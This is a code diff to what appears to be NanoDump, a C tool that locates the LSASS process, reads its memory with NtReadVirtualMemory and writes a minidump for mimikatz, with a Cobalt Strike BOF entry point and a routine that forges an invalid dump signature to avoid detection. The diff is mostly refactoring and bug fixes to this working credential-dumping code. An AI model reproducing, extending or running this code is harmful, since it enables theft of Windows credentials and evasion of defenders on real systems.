@@ -542,26 +542,26 @@ BOOL write_system_info_stream(
 
     // read the version and build numbers from the PEB
     PVOID pPeb;
-    ULONG32* OSMajorVersion;
-    ULONG32* OSMinorVersion;
-    USHORT* OSBuildNumber;
-    ULONG32* OSPlatformId;
-    UNICODE_STRING* CSDVersion;
+    PULONG32 OSMajorVersion;
+    PULONG32 OSMinorVersion;
+    PUSHORT OSBuildNumber;
+    PULONG32 OSPlatformId;
+    PUNICODE_STRING CSDVersion;
     pPeb = (PVOID)READ_MEMLOC(PEB_OFFSET);
 
 #if _WIN64
-    OSMajorVersion = (ULONG32*)(((ULONG64)(pPeb)) + 0x118);
-    OSMinorVersion = (ULONG32*)(((ULONG64)(pPeb)) + 0x11c);
-    OSBuildNumber = (USHORT*)(((ULONG64)(pPeb)) + 0x120);
-    OSPlatformId = (ULONG32*)(((ULONG64)(pPeb)) + 0x124);
-    CSDVersion = (UNICODE_STRING*)(((ULONG64)(pPeb)) + 0x2e8);
+    OSMajorVersion = (PULONG32)(((ULONG64)(pPeb)) + 0x118);
+    OSMinorVersion = (PULONG32)(((ULONG64)(pPeb)) + 0x11c);
+    OSBuildNumber = (PUSHORT)(((ULONG64)(pPeb)) + 0x120);
+    OSPlatformId = (PULONG32)(((ULONG64)(pPeb)) + 0x124);
+    CSDVersion = (PUNICODE_STRING)(((ULONG64)(pPeb)) + 0x2e8);
     system_info.ProcessorArchitecture = 9; // AMD64
 #else
-    OSMajorVersion = (ULONG32*)(((ULONG32)(pPeb)) + 0xa4);
-    OSMinorVersion = (ULONG32*)(((ULONG32)(pPeb)) + 0xa8);
-    OSBuildNumber = (USHORT*)(((ULONG32)(pPeb)) + 0xac);
-    OSPlatformId = (ULONG32*)(((ULONG32)(pPeb)) + 0xb0);
-    CSDVersion = (UNICODE_STRING*)(((ULONG32)(pPeb)) + 0x1f0);
+    OSMajorVersion = (PULONG32)(((ULONG32)(pPeb)) + 0xa4);
+    OSMinorVersion = (PULONG32)(((ULONG32)(pPeb)) + 0xa8);
+    OSBuildNumber = (PUSHORT)(((ULONG32)(pPeb)) + 0xac);
+    OSPlatformId = (PULONG32)(((ULONG32)(pPeb)) + 0xb0);
+    CSDVersion = (PUNICODE_STRING)(((ULONG32)(pPeb)) + 0x1f0);
     system_info.ProcessorArchitecture = 0; // INTEL
 #endif
 
@@ -909,6 +909,7 @@ Pmodule_info find_modules(
                     last_module->next = new_module;
                 }
                 dlls_found++;
+                break;
             }
         }
 
@@ -950,7 +951,7 @@ Pmodule_info write_module_list_stream(
         ARRAY_SIZE(important_modules),
         TRUE
     );
-    if (module_list == NULL)
+    if (!module_list)
         return NULL;
 
     // write the full path of each dll
@@ -1047,7 +1048,7 @@ void free_linked_list(
     PVOID head
 )
 {
-    if (head == NULL)
+    if (!head)
         return;
 
     ULONG32 number_of_nodes = 1;
@@ -1093,6 +1094,7 @@ PMiniDumpMemoryDescriptor64 get_memory_ranges(
 {
     PMiniDumpMemoryDescriptor64 ranges_list = NULL;
     PVOID base_address, current_address;
+    PMiniDumpMemoryDescriptor64 new_range;
     ULONG64 region_size;
     current_address = 0;
     MEMORY_INFORMATION_CLASS mic = 0;
@@ -1135,7 +1137,7 @@ PMiniDumpMemoryDescriptor64 get_memory_ranges(
                 module_list))
             continue;
 
-        PMiniDumpMemoryDescriptor64 new_range = intAlloc(sizeof(MiniDumpMemoryDescriptor64));
+        new_range = intAlloc(sizeof(MiniDumpMemoryDescriptor64));
         if(!new_range)
         {
 #ifdef BOF
@@ -1151,6 +1153,9 @@ PMiniDumpMemoryDescriptor64 get_memory_ranges(
         new_range->next = NULL;
         new_range->StartOfMemoryRange = (ULONG_PTR)base_address;
         new_range->DataSize = region_size;
+        new_range->State = mbi.State;
+        new_range->Protect = mbi.Protect;
+        new_range->Type = mbi.Type;
 
         if (!ranges_list)
         {
@@ -1172,14 +1177,15 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
     Pmodule_info module_list
 )
 {
+    PMiniDumpMemoryDescriptor64 memory_ranges;
     ULONG32 stream_rva = dc->rva;
 
-    PMiniDumpMemoryDescriptor64 memory_ranges = get_memory_ranges(
+    memory_ranges = get_memory_ranges(
         dc,
         module_list
     );
     if (!memory_ranges)
-        return FALSE;
+        return NULL;
 
     // write the number of ranges
     ULONG64 number_of_ranges = 1;
@@ -1212,7 +1218,8 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
     curr_range = memory_ranges;
     while (curr_range)
     {
-        BYTE* buffer = intAlloc(curr_range->DataSize);
+        // DataSize can be very large but HeapAlloc should be able to handle it
+        PBYTE buffer = intAlloc(curr_range->DataSize);
         if (!buffer)
         {
 #ifdef BOF
@@ -1233,14 +1240,20 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
             curr_range->DataSize,
             NULL
         );
-        if (!NT_SUCCESS(status))
+        // once in a while, a range fails with STATUS_PARTIAL_COPY, not relevant for mimikatz
+        if (!NT_SUCCESS(status) && status != STATUS_PARTIAL_COPY)
         {
 #ifdef BOF
             BeaconPrintf(CALLBACK_ERROR,
 #else
             printf(
 #endif
-                "Failed to call NtReadVirtualMemory, status: 0x%lx. Continuing anyways...\n",
+                "Failed to read memory range: StartOfMemoryRange: 0x%p, DataSize: 0x%llx, State: 0x%lx, Protect: 0x%lx, Type: 0x%lx, NtReadVirtualMemory status: 0x%lx. Continuing anyways...\n",
+                (PVOID)(ULONG_PTR)curr_range->StartOfMemoryRange,
+                curr_range->DataSize,
+                curr_range->State,
+                curr_range->Protect,
+                curr_range->Type,
                 status
             );
             //return NULL;
@@ -1274,7 +1287,10 @@ BOOL NanoDumpWriteDump(
     PMiniDumpMemoryDescriptor64 memory_ranges;
     memory_ranges = write_memory64_list_stream(dc, module_list);
     if (!memory_ranges)
+    {
+        free_linked_list(module_list); module_list = NULL;
         return FALSE;
+    }
 
     free_linked_list(module_list); module_list = NULL;
 
@@ -1342,7 +1358,7 @@ HANDLE find_lsass(void)
     }
 }
 
-PVOID allocate_memory(SIZE_T* RegionSize)
+PVOID allocate_memory(PSIZE_T RegionSize)
 {
     PVOID BaseAddress = NULL;
     NTSTATUS status = NtAllocateVirtualMemory(
@@ -1400,12 +1416,12 @@ void generate_invalid_sig(
     time_t t;
     MSVCRT$srand((unsigned) MSVCRT$time(&t));
 
-    *Signature = 0x504d444d;
-    *Version = 42899;
-    *ImplementationVersion = 0;
-    while (*Signature == 0x504d444d ||
-           *Version == 42899 ||
-           *ImplementationVersion == 0)
+    *Signature = MINIDUMP_SIGNATURE;
+    *Version = MINIDUMP_VERSION;
+    *ImplementationVersion = MINIDUMP_IMPL_VERSION;
+    while (*Signature == MINIDUMP_SIGNATURE ||
+           *Version == MINIDUMP_VERSION ||
+           *ImplementationVersion == MINIDUMP_IMPL_VERSION)
     {
         *Signature = 0;
         *Signature |= (MSVCRT$rand() & 0x7FFF) << 0x11;
@@ -1787,9 +1803,9 @@ void go(char* args, int length)
     // set the signature
     if (use_valid_sig)
     {
-        Signature = 0x504d444d;
-        Version = 42899;
-        ImplementationVersion = 0;
+        Signature = MINIDUMP_SIGNATURE;
+        Version = MINIDUMP_VERSION;
+        ImplementationVersion = MINIDUMP_IMPL_VERSION;
     }
     else
     {
@@ -2032,9 +2048,9 @@ int main(int argc, char* argv[])
     // set the signature
     if (use_valid_sig)
     {
-        Signature = 0x504d444d;
-        Version = 42899;
-        ImplementationVersion = 0;
+        Signature = MINIDUMP_SIGNATURE;
+        Version = MINIDUMP_VERSION;
+        ImplementationVersion = MINIDUMP_IMPL_VERSION;
     }
     else
     {
